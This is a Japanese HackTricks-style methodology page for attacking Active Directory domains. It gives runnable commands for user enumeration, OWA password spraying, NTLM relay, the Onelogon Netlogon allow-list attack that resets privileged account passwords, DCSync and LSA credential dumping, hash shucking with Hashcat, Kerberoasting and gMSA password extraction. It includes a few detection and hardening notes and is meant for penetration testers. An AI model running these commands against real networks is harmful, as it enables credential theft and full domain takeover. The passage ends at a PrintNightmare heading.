# Active Directory の方法論

{{#include ../../banners/hacktricks-training.md}}

## 基本概要

**Active Directory** は基盤となるテクノロジーであり、**ネットワーク管理者**がネットワーク内の**ドメイン**、**ユーザー**、**オブジェクト**を効率的に作成・管理できるようにします。拡張性を考慮して設計されており、多数のユーザーを管理しやすい**グループ**や**サブグループ**に編成し、さまざまなレベルで**アクセス権**を制御できます。

**Active Directory** の構造は、主に**ドメイン**、**ツリー**、**フォレスト**の3つの階層で構成されています。**ドメイン**は、共通のデータベースを共有する**ユーザー**や**デバイス**などのオブジェクトの集合です。**ツリー**は共通の構造で結び付けられた複数のドメインのグループであり、**フォレスト**は**信頼関係**で相互接続された複数のツリーの集合で、組織構造の最上位の階層を形成します。各階層で、特定の**アクセス権**と**通信権**を設定できます。

**Active Directory** の主な概念は次のとおりです。

1. **ディレクトリ** – Active Directory オブジェクトに関するすべての情報を格納します。
2. **オブジェクト** – ディレクトリ内のエンティティを指し、**ユーザー**、**グループ**、**共有フォルダー**などが含まれます。
3. **ドメイン** – ディレクトリオブジェクトを格納するコンテナーです。1つの**フォレスト**内に複数のドメインを共存させ、それぞれが独自のオブジェクトの集合を保持できます。
4. **ツリー** – 共通のルートドメインを共有するドメインのグループです。
5. **フォレスト** – Active Directory の組織構造の最上位であり、相互に**信頼関係**を持つ複数のツリーで構成されます。

**Active Directory Domain Services (AD DS)** は、ネットワーク内の集中管理と通信に不可欠なさまざまなサービスを提供します。これらのサービスには次のものがあります。

1. **Domain Services** – データを一元的に保存し、**認証**や**検索**など、**ユーザー**と**ドメイン**間のやり取りを管理します。
2. **Certificate Services** – 安全な**デジタル証明書**の作成、配布、管理を担います。
3. **Lightweight Directory Services** – **LDAP protocol** を通じてディレクトリ対応アプリケーションをサポートします。
4. **Directory Federation Services** – 1回のセッションで複数のWebアプリケーションにわたってユーザーを認証する**シングルサインオン**機能を提供します。
5. **Rights Management** – 著作物の不正な配布や使用を規制し、保護を支援します。
6. **DNS Service** – **ドメイン名**の名前解決に不可欠です。

詳しい説明については、[**TechTerms - Active Directory の定義**](https://techterms.com/definition/active_directory)を確認してください。

### **Kerberos Authentication**

**AD を攻撃する**には、**Kerberos authentication process** を十分に**理解する**必要があります。\
[**仕組みがまだわからない場合は、このページを読んでください。**](kerberos-authentication.md)

## チートシート

[https://wadcoms.github.io/](https://wadcoms.github.io) を参照すると、AD の列挙やexploitに使えるコマンドを手早く確認できます。

> [!WARNING]
> Kerberos 通信では通常、クライアントが正しい SPN のチケットを取得できるように、**完全修飾ドメイン名 (FQDN)** が必要です。マシンに IP アドレスでアクセスすると、Kerberos ではなく NTLM にフォールバックすることがよくあります。

## Active Directory の偵察 (No creds/sessions)

AD 環境にアクセスできても、認証情報やセッションがない場合は、次のことができます。

- **ネットワークのPentest:**
  - ネットワークをスキャンしてマシンと開いているポートを見つけ、**脆弱性をexploit**するか、マシンから**認証情報を抽出**します (たとえば、[プリンターは非常に興味深い標的になることがあります](ad-information-in-printers.md))。
  - DNS を列挙すると、ドメイン内のWebサーバー、プリンター、共有、VPN、メディアなど、重要なサーバーに関する情報が得られる場合があります。
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - 詳細については、一般的な[**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md)を確認してください。
- **SMB サービスで null および Guest アクセスを確認する** (最新の Windows バージョンでは機能しません):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - SMB サーバーの列挙方法について、詳しいガイドはこちらにあります。


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **LDAP の列挙**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - LDAP の列挙方法について、詳しいガイドはこちらにあります (**匿名アクセス**には特に注意してください)。


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **ネットワークをpoisonする**
  - [**Responder でサービスをimpersonateする**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)ことで認証情報を収集する
  - [**relay attack を悪用する**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)ことでホストにアクセスする
  - [**evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)で偽の UPnP サービスを**公開**して認証情報を収集する
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - ドメイン環境内の内部文書、ソーシャルメディア、サービス (主にWeb) や、公開情報からユーザー名や氏名を抽出します。
  - 会社の従業員の氏名をすべて見つけた場合は、さまざまな AD **ユーザー名の命名規則**を試せます (**[こちらを参照](https://activedirectorypro.com/active-directory-user-naming-convention/)**)。よく使われる規則は、_NameSurname_、_Name.Surname_、_NamSur_ (それぞれ3文字)、_Nam.Sur_、_NSurname_、_N.Surname_、_SurnameName_、_Surname.Name_、_SurnameN_、_Surname.N_、_ランダムな英字3文字とランダムな数字3桁_ (abc123) です。
  - ツール:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### ユーザー列挙

- **匿名 SMB/LDAP 列挙:** [**SMB のpentesting**](../../network-services-pentesting/pentesting-smb/index.html)と[**LDAP のpentesting**](../../network-services-pentesting/pentesting-ldap.md)のページを確認してください。
- **Kerbrute 列挙**: **無効なユーザー名が要求される**と、サーバーは **Kerberos error** code _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ で応答するため、ユーザー名が無効であると判断できます。**有効なユーザー名**の場合は、**AS-REP の TGT** または _KRB5KDC_ERR_PREAUTH_REQUIRED_ エラーが返されます。後者は、そのユーザーに pre-authentication が必要であることを示します。
- **MS-NRPC に対する認証なし**: ドメインコントローラー上の MS-NRPC (Netlogon) インターフェースに対し、auth-level = 1 (認証なし) を使用します。この手法では、MS-NRPC インターフェースにバインドした後、`DsrGetDcNameEx2` 関数を呼び出し、認証情報なしでユーザーまたはコンピューターが存在するか確認します。[NauthNRPC](https://github.com/sud0Ru/NauthNRPC) ツールは、この種の列挙を実装しています。研究内容は[こちら](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>で確認できます。

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access) Server**

ネットワーク内でこれらのサーバーのいずれかを見つけた場合、**user enumeration** を実行することもできます。たとえば、[**MailSniper**](https://github.com/dafthack/MailSniper) ツールを使用できます。

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> ユーザー名のリストは[**この GitHub リポジトリ**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)と、こちらのリポジトリ（[**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)）で確認できます。
>
> ただし、事前に実施した recon の段階で、**その会社で働いている人の氏名**を把握しているはずです。氏名があれば、[**namemash.py**](https://gist.github.com/superkojiman/11076951)スクリプトを使って、有効な可能性のあるユーザー名を生成できます。

### Netlogon の脆弱なチャネルの allow-list 悪用（Onelogon）

DC に **Zerologon** のパッチを適用した後も、明示的に allow-list に登録されたアカウントは、**レガシーの脆弱な Netlogon secure-channel 動作**にさらされる可能性があります。リスクのある設定は、GPO の **`Domain controller: Allow vulnerable Netlogon secure channel connections`**、または対応するレジストリ値 **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`** です。

この値は **SDDL セキュリティ記述子**です（[Security Descriptors](security-descriptors.md)を参照）。DACL 内で該当する ACE を付与されたアカウントやグループは、攻撃対象になり得ます。たとえば、`O:BAG:BAD:(A;;RC;;;WD)` は実質的に **Everyone** を allow-list に登録します。

実際のオペレーターの手順：

1. **SYSVOL/GPO** と **稼働中の DC のレジストリ**の両方を確認し、allow-list に登録されたプリンシパルを特定する。
2. SDDL 内の SID を実際の AD ユーザーやコンピューターに対応付け、**DC のマシンアカウント**、**信頼アカウント**、その他の特権マシンを優先する。
3. allow-list に登録されたアカウントとして、**MS-NRPC / Netlogon 認証**を繰り返し試行する。
4. 推測に成功したら、**Netlogon のパスワード設定**を悪用して対象アカウントのパスワードをリセットする（公開 PoC では空文字列に設定する）。<sup>[[9]](#references)[[10]](#references)</sup>

公開されている成果物に基づく、簡単なトリアージ / ラボの例：

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

メモ:

- **scanner** が有用なのは、有効な許可リストが **SYSVOL**、**registry**、またはその両方に存在する可能性があるためです。
- 脆弱なアカウントを特定した後は、**Domain Admin privileges** がなくても exploit path を実行できる点が重要です。
- **DC$** などの **Domain Controller machine account** を侵害すると、パスワードのリセットによって、より広範な **AD takeover** の経路を直接利用できるため、特に危険です。
- **Brute-force feasibility** はモードによって異なります。公開されている artifact では、meet-in-the-middle アプローチ、別の computer account が利用できる場合の **24-bit** brute force、さらに時間のかかる **32-bit** variant が説明されています。

検知 / hardening に関するメモ:

- 許可リストのポリシーを監査し、一時的かつ明示的に必要な互換性例外以外はすべて削除してください。
- DC の **System** イベント **5827/5828/5829/5830/5831** を監視し、脆弱な Netlogon 接続が拒否、検出、またはポリシーによって明示的に許可されたことを把握してください。
- レガシー依存関係が解消されるまでは、`VulnerableChannelAllowList` 内のアカウントを**高リスク**として扱ってください。

### 1つ以上のユーザー名が分かっている場合

有効なユーザー名は分かっているけれど、パスワードが分からない場合は、次を試してください。

- [**ASREPRoast**](asreproast.md): ユーザーに _DONT_REQ_PREAUTH_ 属性が**設定されていない**場合、そのユーザーの **AS_REP message** を**要求**できます。このメッセージには、ユーザーのパスワードから導出された値で暗号化されたデータが含まれます。
- [**Password Spraying**](password-spraying.md): 発見した各ユーザーに対して、よく使われる**パスワード**を試してみましょう。弱いパスワードを使っているユーザーがいるかもしれません（パスワードポリシーに注意してください）。
  - OWA servers に対しても **spray** を実行し、ユーザーのメールサーバーへのアクセスを試みることができます。


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

ネットワーク上のプロトコルを **poisoning** して、クラック可能な challenge **hashes** を**取得**できる場合があります。


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory の列挙によって、ユーザー名、メール識別子や命名パターン、候補となるホスト、認証を強制できる可能性のあるサービスが分かります。この情報を使って、実行可能な NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) と、AD 環境への侵入経路を特定してください。

### NetExec workspace を使った recon と relay posture の確認

- **`nxcdb` workspaces** を使って、engagement ごとに AD recon の状態を管理します。`workspace create <name>` を実行すると、`~/.nxc/workspaces/<name>` の下にプロトコルごとの SQLite DB（smb/mssql/winrm/ldap など）が作成されます。`proto smb|mssql|winrm` で表示を切り替え、`creds` で収集した secret を一覧表示できます。作業が終わったら、機密データを手動で削除してください: `rm -rf ~/.nxc/workspaces/<name>`。<sup>[[6]](#references)</sup>
- **`netexec smb <cidr>`** でサブネットを手早く探索すると、**domain**、**OS build**、**SMB signing の要件**、**Null Auth** が確認できます。`(signing:False)` と表示されるメンバーは **relay の影響を受けやすく**、DC では多くの場合 signing が必須です。
- NetExec の出力から **/etc/hosts** 用の **hostnames** を生成し、targeting を容易にします:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- 署名によって **DC への SMB relay がブロックされている**場合も、**LDAP** の設定を調査してください。`netexec ldap <dc>` では `(signing:None)` や弱い channel binding が表示されます。SMB signing が必須でも LDAP signing が無効な DC は、**SPN-less RBCD** などの悪用に使える **LDAP relay** の標的となります。

### クライアント側プリンターの認証情報 leak → ドメイン認証情報の一括検証

- プリンターや Web UI の HTML に、マスクされた管理者パスワードが埋め込まれていることがあります。ソースや開発者ツールを確認すると平文（例: `<input value="<password>">`）が見つかり、Basic-auth でスキャン・印刷リポジトリにアクセスできる場合があります。
- 取得した印刷ジョブに、ユーザーごとのパスワードが記載された **平文のオンボーディング文書** が含まれていることがあります。検証時は対応関係を崩さないようにしてください:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### NTLM認証情報の窃取

**nullユーザーまたはguestユーザーで他のPCや共有にアクセスできる**場合、ファイル（SCFファイルなど）を**配置**できます。そのファイルが何らかの形でアクセスされると、**あなたに対するNTLM認証が発生し**、**NTLM challengeを盗み出して**解析できます。


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash ShuckingとNT-Candidate攻撃

**Hash shucking**では、すでに持っている各NT hashを、鍵素材がNT hashから直接導出される、より処理の重い形式の候補パスワードとして扱います。Kerberos RC4 ticket、NetNTLM challenge、またはキャッシュされた認証情報に対して長いパスフレーズを総当たりする代わりに、NT hashをHashcatのNT-candidate modeに入力し、平文を一度も知ることなくパスワードの再利用を検証できます。ドメイン侵害後に、現在および過去のNT hashを数千件収集できた場合、特に有効です。<sup>[[5]](#references)</sup>

次の場合にshuckingを使用します。

- DCSync、SAM/SECURITY dump、またはcredential vaultからNT hashのコーパスを入手し、他のドメインやフォレストでの再利用を確認する必要がある。
- RC4ベースのKerberos情報（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM response、またはDCC/DCC2 blobを取得した。
- 解読不可能な長いパスフレーズの再利用をすばやく証明し、ただちにPass-the-Hashで横展開したい。

この手法は、鍵がNT hashではない暗号化方式（例：Kerberos etype 17/18 AES）には**機能しません**。ドメインでAESのみが強制されている場合は、通常のパスワードmodeに戻す必要があります。

#### NT hashコーパスの構築

- **DCSync/NTDS** – `secretsdump.py`で履歴も含めて取得し、できるだけ多くのNT hash（過去の値も含む）を収集します。

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  History entriesは候補の範囲を大幅に広げます。Microsoftはアカウントごとに最大24個の過去のハッシュを保存できるためです。NTDS secretsを収集する方法については、以下を参照してください。

{{#ref}}
dcsync.md
{{#endref}}

- **エンドポイントのキャッシュダンプ** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（またはMimikatzの`lsadump::sam /patch`）で、ローカルのSAM/SECURITYデータとキャッシュされたドメインログオン情報（DCC/DCC2）を抽出します。重複を削除し、これらのハッシュを同じ`nt_candidates.txt`リストに追加します。
- **メタデータの記録** – 各ハッシュを生成したユーザー名/ドメインを記録しておきます（ワードリストに16進数しか含まれていない場合も同様です）。Hashcatが一致する候補を出力すれば、ハッシュからパスワードを再利用しているプリンシパルがすぐに分かります。
- shucking時の重複を見つけやすくするため、同じフォレストまたは信頼関係のあるフォレストからの候補を優先します。

#### HashcatのNT候補モード

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

補足:

- NT候補の入力には**生の32桁の16進数NTハッシュを使用する必要があります**。ルールエンジンを無効にしてください（`-r`やハイブリッドモードは使わないでください）。加工によって候補のキー素材が破損するためです。
- これらのモード自体が特に高速というわけではありませんが、NTLMのキー空間（M3 Maxで約30,000 MH/s）はKerberos RC4（約300 MH/s）の約100倍高速です。厳選したNTリストを試すほうが、低速な形式でパスワード空間全体を探索するより、はるかに低コストです。
- モード31500/31600/35300/35400は最近追加されたため、必ず**最新のHashcatビルド**を使用してください（`git clone https://github.com/hashcat/hashcat && make install`）。<sup>[[7]](#references)</sup>
- 現在、AS-REQ Pre-Auth用のNTモードはありません。また、AES etype（19600/19700）では、生のNTハッシュではなく、UTF-16LEパスワードからPBKDF2で鍵を導出するため、平文パスワードが必要です。

#### 例 – Kerberoast RC4（モード35300）

1. 低権限ユーザーで、対象SPNのRC4 TGSを取得します（詳細はKerberoastのページを参照）。

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. NT listを使ってチケットをShuckする:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat は各 NT 候補から RC4 key を導出し、`$krb5tgs$23$...` blob を検証します。一致すれば、そのサービスアカウントが既存の NT hash のいずれかを使用していることが確認できます。

3. すぐに PtH に移行します:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   必要であれば、後で `hashcat -m 1000 <matched_hash> wordlists/` を使って平文を復元できます。

#### 例 – キャッシュされた認証情報（mode 31600）

1. 侵害したワークステーションからキャッシュされたログオン情報をダンプします。

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. 対象となるドメインユーザーの DCC2 行を `dcc2_highpriv.txt` にコピーして、shuck します。

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. 一致に成功すると、リストですでに把握している NT hash が得られ、キャッシュされたユーザーがパスワードを再利用していることが確認できます。そのまま PtH に使用するか（`nxc smb <dc_ip> -u highpriv -H <hash>`）、高速な NTLM モードで brute-force して文字列を復元します。

同じ手順は NetNTLM challenge-response（`-m 27000/27100`）と DCC（`-m 31500`）にも適用できます。一致が確認できたら、relay、SMB/WMI/WinRM PtH を実行するか、マスクやルールを使ってオフラインで NT hash を再度 crack できます。



## 認証情報／セッションを使った Active Directory の列挙

このフェーズでは、**有効なドメインアカウントの認証情報またはセッションを侵害している必要があります。** 有効な認証情報、またはドメインユーザーとしての shell がある場合、**前述の手法も引き続き他のユーザーを侵害するために使えることを覚えておいてください。**

認証済みの列挙を始める前に、**Kerberos の double-hop 問題**を理解してください。


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 列挙

アカウントの侵害は、**ドメインの評価に向けた重要な一歩です**。認証済みの **Active Directory 列挙**が可能になるためです。

[**ASREPRoast**](asreproast.md) については、脆弱な可能性のあるユーザーをすべて特定できます。また、[**Password Spraying**](password-spraying.md) については、**すべてのユーザー名のリスト**を取得し、侵害したアカウントのパスワード、空のパスワード、新たに有望と思われるパスワードを試せます。

- [**基本的な recon を行う CMD**](../basic-cmd-for-pentesters.md#domain-info) を使用できます。
- より stealthy な [**recon 用 powershell**](../basic-powershell-for-pentesters/index.html) も使用できます。
- [**powerview の使用**](../basic-powershell-for-pentesters/powerview.md)で、より詳細な情報を取得できます。
- Active Directory の recon に使える優れたツールとして、[**BloodHound**](bloodhound.md) もあります。（使用する収集方法によりますが）**あまり stealthy ではありません**。ただし、**それを気にしない**のであれば、ぜひ試してみてください。ユーザーが RDP できる場所や、他のグループへの経路などを確認できます。
  - **その他の自動 AD 列挙ツール:** [**AD Explorer**](bloodhound.md#ad-explorer)**、** [**ADRecon**](bloodhound.md#adrecon)**、** [**Group3r**](bloodhound.md#group3r)**、** [**PingCastle**](bloodhound.md#pingcastle)**。**
- 興味深い情報が含まれている可能性があるため、[**AD の DNS レコード**](ad-dns-records.md)も確認してください。
- ディレクトリの列挙には、**SysInternal** Suite の **AdExplorer.exe** という **GUI ツール**も使えます。
- **ldapsearch** を使って LDAP データベースを検索し、_userPassword_ や _unixUserPassword_ フィールド、またはユーザーの _description_ や _info_ のメモから認証情報を探すこともできます。_info_ にある、ラベルのないパスワードらしき文字列は候補にすぎません。用途と有効性を別途確認し、通常の列挙出力にメモの内容を含めないでください。他の方法については、PayloadsAllTheThings の [AD User comment 内の Password](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) を参照してください。
- 許可されている場合は、`\\<dc>\NETLOGON` または `\\<dc>\SYSVOL\<domain>\scripts` にある、アクセス可能なドメインのログオンスクリプトやドライブマッピングスクリプトを確認してください。[Microsoft のドキュメント](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller)では、NETLOGON share がスクリプトディレクトリとして果たす役割が説明されています。最初に名前だけを一覧表示し、サイズ上限を設けたうえで、関連性があり読み取り可能なスクリプトだけを調べてください。share 全体を dump したり、通常の列挙中に認証情報の値を表示したりしないでください。[`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) を呼び出していても、スクリプトに保存された平文のパスワードは **保護されません**。この呼び出しだけでは秘密情報がハードコードされている証拠にはなりません。実際の入力を追跡し、アカウント、認証情報の有効性、権限をそれぞれ別途確認してください。ドメインスクリプトの確認はリモート share の調査であり、ローカルホストの列挙とは別です。
- **Linux** を使っている場合は、[**pywerview**](https://github.com/the-useless-one/pywerview) でドメインを列挙することもできます。
- 次のような自動ツールも試せます。
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **ドメインユーザーをすべて抽出する**

  Windows では、ドメイン内のユーザー名をすべて簡単に取得できます（`net user /domain`、`Get-DomainUser`、または `wmic useraccount get name,sid`）。Linux では、次を使用できます: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` または `enum4linux -a -u "user" -p "password" <DC IP>`

> この Enumeration セクションは短く見えるかもしれませんが、全体の中で最も重要な部分です。リンク（特に cmd、powershell、powerview、BloodHound のリンク）を開き、ドメインの列挙方法を学び、慣れるまで練習してください。評価の際、ここが DA への道を見つける、あるいは何もできないと判断するための重要な段階になります。

### 予測可能な事前作成済みコンピューターアカウント -> gMSA パスワードへのアクセス

従来の join 用に用意されたコンピューターアカウントでは、予測可能な初期パスワードが残っていることがあります。NetExec の `pre2k` module は、特徴的な `userAccountControl` の値 `4128`（`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`）を特定し、末尾の `$` を除いたコンピューター名の小文字表記の先頭 14 文字を使って Kerberos TGT を試します。この UAC 値は候補を絞るための条件として扱い、**Pre-Windows 2000 Compatible Access** に属しているだけでパスワードが弱いと決めつけないでください。<sup>[[18]](#references)[[20]](#references)</sup>

認証済み LDAP 列挙を使って候補をテストし、成功した TGT を保存してください。`ALL=True` を指定すると、デフォルトの `4128` filter に一致するオブジェクト以外もテスト対象になります。<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

デフォルト/NTLM bind に失敗しても、この finding が無効になるわけではありません。`-k`、DC に解決される FQDN、および KDC と同期した時計を使ってテストしてください。module の実行に成功すると、候補リストと取得した ccaches が `~/.nxc/modules/pre2k/` 以下に書き込まれます。<sup>[[18]](#references)[[20]](#references)</sup>

computer principal を侵害した後は、ネストされたグループメンバーシップと外向きの権限をグラフ化してください。特に、gMSA の `msDS-GroupMSAMembership` セキュリティ記述子に記載された principal は `msDS-ManagedPassword` を読み取れます。NetExec の `--gmsa` 出力には許可された principal が表示され、認証に使うコンピュータに権限がある場合は、現在の NT hash が返されます。<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

その後、復元したgMSAを他の認証情報と同様に評価します。ローカル／ドメインのグループメンバーシップ、ログオン権限、SPN、委任、およびアクセス可能なサービスを調査してから、pass-the-hashを試してください。このACLベースの取得経路は、KDS root keyの侵害後に管理パスワードを導出する[Golden gMSA/dMSA](golden-dmsa-gmsa.md)とは別のものです。<sup>[[20]](#references)</sup>

コンピュータープリンシパルが、他のコンピューターオブジェクトやグループに対するアウトバウンド制御権を持つ場合もあります。取得後は、ネストされたメンバーシップと有効なACLを個別に調査してください。別のコンピューターオブジェクトに対する書き込み権限はアカウントの変更につながる可能性があり、グループのメンバーシップ権限はログオン権限につながる可能性があります。ステージングアカウントのフラグ、予測可能な命名規則、または`GenericWrite`の関係だけでは、経路全体を証明できません。

ファイル、共有、またはバックアップに保存された`msDS-ManagedPassword` blobの読み取り可能なコピーは、別個の露出経路です。LDAPの読み取りACLでは、別の場所に保存されたコピーを保護できません。データを解釈する前に、managed-password blobであることを確認し、認可されたLDAP読み取りとKDS root keyからの導出の両方と区別してください。

### Kerberoast

Kerberoastingでは、ユーザーアカウントに紐付いたサービスで使用される**TGSチケット**を取得し、その暗号化（ユーザーパスワードに基づく）を**オフライン**でクラックします。

詳細はこちら：

{{#ref}}
kerberoast.md
{{#endref}}

### リモート接続（RDP、SSH、FTP、Win-RMなど）

認証情報を取得したら、アクセス可能な**マシン**があるか確認します。その場合、ポートスキャンの結果に応じた複数のプロトコルを使って、**CrackMapExec**で複数のサーバーへの接続を試すことができます。

### ローカル権限昇格

侵害した認証情報、または一般的なドメインユーザーとしてのセッションがあり、ドメイン内の**任意のマシン**にアクセスできる場合は、**ローカルで権限を昇格し、認証情報を収集する**方法を探してください。ローカル管理者権限があれば、メモリ（LSASS）やローカルストレージ（SAM）から**他のユーザーのハッシュをダンプ**できる場合があります。

この書籍には[**Windowsでのローカル権限昇格**](../windows-local-privilege-escalation/index.html)に関する専用ページと、[**チェックリスト**](../checklist-windows-privilege-escalation.md)があります。また、[**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)も忘れずに使用してください。

### 現在のセッションチケット

現在のユーザーの**チケット**に、予期しないリソースへのアクセスを**許可するもの**が含まれている可能性は非常に**低い**ですが、次のように確認できます：

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

ドメインの認証情報またはユーザーセッションがある場合は、NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)を再検討しましょう。認証済みの列挙や強制認証の手法により、未認証の偵察では利用できなかったrelay経路が見つかることがあります。

### コンピューター共有 | SMB共有内の認証情報を探す

基本的な認証情報を入手したら、AD内で共有されている**興味深いファイルを見つけられるか**確認しましょう。手動でもできますが、非常に退屈で反復的な作業です（確認するドキュメントが何百も見つかった場合はなおさらです）。

[**利用できるツールについては、このリンクを参照してください。**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM認証情報を窃取する

**他のPCや共有にアクセスできる**場合は、ファイル（SCFファイルなど）を**設置**できます。そのファイルが何らかの方法でアクセスされると、あなたに対するNTLM認証を**誘発**し、**NTLM challenge**を**窃取**してクラックできます。


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

